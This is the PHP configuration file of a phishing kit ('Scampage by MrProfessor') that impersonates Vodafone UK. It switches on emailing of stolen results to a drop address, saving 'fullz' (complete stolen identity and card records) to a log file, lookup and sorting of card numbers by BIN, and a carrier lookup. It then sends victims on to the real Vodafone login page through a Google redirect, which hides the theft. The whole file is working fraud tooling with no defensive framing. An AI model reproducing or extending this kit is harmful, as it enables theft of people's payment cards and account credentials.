<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 0;
$sendEmail = 1;
$binList = 1;
$binSave = 0;

$to = "email@protonmail.com";
$ExitLink = "https://www.google.com/url?sa=t&source=web&rct=j&url=https://www.vodafone.co.uk/my-vodafone/log-in/&ved=2ahUKEwiBzNqV04XiAhUltHEKHWw1Bt8QFjABegQIBBAB&usg=AOvVaw39a59fUxywgDubsSLQR5qG"; // Real site via google redirect

?>